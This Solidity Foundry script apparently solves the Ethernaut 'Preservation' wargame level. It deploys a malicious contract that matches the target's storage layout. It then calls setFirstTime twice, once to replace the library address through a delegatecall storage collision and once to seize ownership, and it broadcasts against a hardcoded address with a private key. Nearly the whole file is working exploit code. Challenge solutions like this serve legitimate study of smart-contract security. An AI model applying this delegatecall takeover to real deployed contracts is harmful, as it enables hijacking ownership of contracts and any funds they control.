// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {

    address public s1;
    address public s2;
    address owner;

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}

contract PreservationSolution is Script {

    address target = 0x4675dFF03e5639d5C2ABf45193c14E61eB372F9c;
    Preservation public preservation = Preservation(target);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack();

        console.log("Before owner : ", preservation.owner());

        preservation.setFirstTime(uint256(uint160(address(attack))));
        preservation.setFirstTime(uint256(uint160(address(attack))));

        console.log("After owner : ", preservation.owner());
        
        vm.stopBroadcast();
    }
}

